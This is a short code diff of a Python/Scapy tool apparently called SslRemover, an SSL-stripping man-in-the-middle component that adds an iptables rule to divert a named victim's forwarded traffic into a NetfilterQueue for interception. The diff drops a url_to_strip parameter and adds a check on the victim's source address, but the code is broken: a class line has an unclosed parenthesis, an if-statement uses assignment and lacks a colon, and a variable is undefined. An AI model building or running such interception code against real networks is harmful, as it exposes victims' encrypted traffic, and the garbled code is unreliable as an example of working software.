@@ -6,12 +6,11 @@ import cryptography    #required for tls
 load_layer("tls")    #enables tls for the https connection with the server
 load_layer("http")    #also useful
 
-class SslRemover(multiprocessing.Process, url_to_strip):
+class SslRemover(multiprocessing.Process:
 
     def __init__(self, ip_victim, queue_num):
         
         multiprocessing.Process.__init__(self)
-        self.url_to_strip = url_to_strip
 
         self.queue         = NetfilterQueue()
         self.iprule_add    = "iptables -I FORWARD -p tcp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
@@ -22,6 +21,8 @@ class SslRemover(multiprocessing.Process, url_to_strip):
 
     def handle_packet(self, packet):
         packet_scapy = IP(packet_nfqueue.get_payload())
+
+        if packet_scapy[IP].src = ip_victim
 
         
         packet.accept()
